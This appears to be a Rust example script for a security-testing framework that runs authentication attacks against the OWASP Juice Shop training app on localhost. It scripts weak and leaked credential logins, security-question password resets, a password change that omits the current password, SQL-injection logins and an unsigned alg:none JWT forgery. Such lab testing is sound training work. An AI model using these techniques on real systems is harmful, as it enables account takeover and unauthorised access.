//! Authentication & Password Reset Scenarios
//!
//! Tests for authentication bypass, password reset, and session management.
//!
//! Run with: cargo run --example juice_shop_auth

use rectitude::payloads::jwt;
use rectitude::prelude::*;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== Authentication Scenarios ===\n");

    let results = vec![
        password_strength().await?,
        login_mc_safesearch().await?,
        login_bjoern().await?,
        bjoerns_favorite_pet().await?,
        reset_jims_password().await?,
        reset_benders_password().await?,
        reset_uvogins_password().await?,
        change_benders_password().await?,
        unsigned_jwt().await?,
        exposed_credentials().await?,
    ];

    let passed = results.iter().filter(|r| r.success).count();
    println!("\n=== Summary: {}/{} passed ===", passed, results.len());

    Ok(())
}

// ============ Weak Passwords ============

async fn password_strength() -> Result<ScenarioResult> {
    Scenario::new("Password Strength - Weak Admin Password")
        .base_url(BASE_URL)
        .tags(&["auth", "weak-password", "difficulty-2"])
        .step(
            "Login with admin123",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op",
                        "password": "admin123"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Logged in with weak password")
                } else {
                    fail("Login failed")
                }
            },
        )
        .run()
        .await
}

async fn login_mc_safesearch() -> Result<ScenarioResult> {
    Scenario::new("Login MC SafeSearch - OSINT Password")
        .base_url(BASE_URL)
        .tags(&["auth", "osint", "difficulty-2"])
        .step(
            "Login with password from lyrics",
            |ctx: Arc<ScenarioContext>| async move {
                // Password from MC SafeSearch's song lyrics
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "mc.safesearch@juice-sh.op",
                        "password": "Mr. N00dles"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Logged in via OSINT")
                } else {
                    fail("Login failed")
                }
            },
        )
        .run()
        .await
}

async fn login_bjoern() -> Result<ScenarioResult> {
    Scenario::new("Login Bjoern - Reversed Base64 Password")
        .base_url(BASE_URL)
        .tags(&["auth", "crypto", "difficulty-4"])
        .step(
            "Decode and reverse password",
            |ctx: Arc<ScenarioContext>| async move {
                // bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI= reversed = bjoern.kimminich@gmail.com
                let encoded = "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=";
                let decoded = base64_decode(encoded).unwrap_or_default();
                let password: String = decoded.chars().rev().collect();

                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "bjoern.kimminich@gmail.com",
                        "password": password
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with(format!("Logged in with reversed password: {}", password))
                } else {
                    fail("Login failed")
                }
            },
        )
        .run()
        .await
}

async fn exposed_credentials() -> Result<ScenarioResult> {
    Scenario::new("Exposed Credentials - From main.js")
        .base_url(BASE_URL)
        .tags(&["auth", "sensitive-data", "difficulty-2"])
        .step(
            "Use credentials from source",
            |ctx: Arc<ScenarioContext>| async move {
                // Found in main.js source code
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "testing@juice-sh.op",
                        "password": "IamUsedForTesting"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Used exposed credentials from source")
                } else {
                    fail("Login failed")
                }
            },
        )
        .run()
        .await
}

// ============ Security Questions ============

async fn bjoerns_favorite_pet() -> Result<ScenarioResult> {
    Scenario::new("Bjoern's Favorite Pet - Security Question")
        .base_url(BASE_URL)
        .tags(&["auth", "security-question", "difficulty-3"])
        .step(
            "Reset with pet name Zaya",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/reset-password")
                    .json(&serde_json::json!({
                        "email": "bjoern@owasp.org",
                        "answer": "Zaya",
                        "new": "newpassword123",
                        "repeat": "newpassword123"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Password reset with OSINT answer")
                } else {
                    fail("Reset failed")
                }
            },
        )
        .run()
        .await
}

async fn reset_jims_password() -> Result<ScenarioResult> {
    Scenario::new("Reset Jim's Password - Star Trek Reference")
        .base_url(BASE_URL)
        .tags(&["auth", "security-question", "difficulty-3"])
        .step(
            "Reset with sibling name Samuel",
            |ctx: Arc<ScenarioContext>| async move {
                // Jim Kirk's brother in Star Trek
                let resp = ctx
                    .post("/rest/user/reset-password")
                    .json(&serde_json::json!({
                        "email": "jim@juice-sh.op",
                        "answer": "Samuel",
                        "new": "newjim123",
                        "repeat": "newjim123"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Jim's password reset")
                } else {
                    fail("Reset failed")
                }
            },
        )
        .run()
        .await
}

async fn reset_benders_password() -> Result<ScenarioResult> {
    Scenario::new("Reset Bender's Password - Futurama Reference")
        .base_url(BASE_URL)
        .tags(&["auth", "security-question", "difficulty-4"])
        .step(
            "Reset with employer Stop'n'Drop",
            |ctx: Arc<ScenarioContext>| async move {
                // Bender's employer in Futurama
                let resp = ctx
                    .post("/rest/user/reset-password")
                    .json(&serde_json::json!({
                        "email": "bender@juice-sh.op",
                        "answer": "Stop'n'Drop",
                        "new": "newbender123",
                        "repeat": "newbender123"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Bender's password reset")
                } else {
                    fail("Reset failed")
                }
            },
        )
        .run()
        .await
}

async fn reset_uvogins_password() -> Result<ScenarioResult> {
    Scenario::new("Reset Uvogin's Password - Hunter x Hunter Reference")
        .base_url(BASE_URL)
        .tags(&["auth", "security-question", "difficulty-4"])
        .step(
            "Reset with favorite movie",
            |ctx: Arc<ScenarioContext>| async move {
                // Uvogin's favorite movie from Hunter x Hunter
                let resp = ctx
                    .post("/rest/user/reset-password")
                    .json(&serde_json::json!({
                        "email": "uvogin@juice-sh.op",
                        "answer": "Silence of the Lambs",
                        "new": "newuvogin123",
                        "repeat": "newuvogin123"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Uvogin's password reset")
                } else {
                    fail("Reset failed")
                }
            },
        )
        .run()
        .await
}

// ============ Authentication Flow Bypass ============

async fn change_benders_password() -> Result<ScenarioResult> {
    Scenario::new("Change Password Without Current")
        .base_url(BASE_URL)
        .tags(&["auth", "parameter-omission", "difficulty-5"])
        .step("Login as Bender", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "bender@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Omit current parameter",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;
                // Exploit: omit 'current' parameter entirely
                let resp = ctx
                    .get("/rest/user/change-password")
                    .bearer_auth(&token)
                    .query("new", "slurmCl4ssic")
                    .query("repeat", "slurmCl4ssic")
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Password changed without current!")
                } else {
                    fail("Exploit failed")
                }
            },
        )
        .run()
        .await
}

// ============ JWT Attacks ============

async fn unsigned_jwt() -> Result<ScenarioResult> {
    Scenario::new("Unsigned JWT - alg:none Attack")
        .base_url(BASE_URL)
        .tags(&["auth", "jwt", "difficulty-5"])
        .step(
            "Login to get valid token",
            |ctx: Arc<ScenarioContext>| async move {
                ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                    .await?;
                ok()
            },
        )
        .step(
            "Forge unsigned JWT",
            |ctx: Arc<ScenarioContext>| async move {
                // Create unsigned JWT with alg: none
                let payload = serde_json::json!({
                    "status": "success",
                    "data": {
                        "id": 1,
                        "email": "jwtn3d@juice-sh.op",
                        "role": "admin"
                    }
                });

                let unsigned_jwt = jwt::create_unsigned(&payload);

                let resp = ctx
                    .get("/rest/whoami")
                    .bearer_auth(&unsigned_jwt)
                    .send()
                    .await?;

                if resp.is_success() && resp.contains("jwtn3d") {
                    ok_with("Unsigned JWT accepted!")
                } else {
                    ok_with(format!(
                        "JWT attack attempted, status: {}",
                        resp.status.as_u16()
                    ))
                }
            },
        )
        .run()
        .await
}
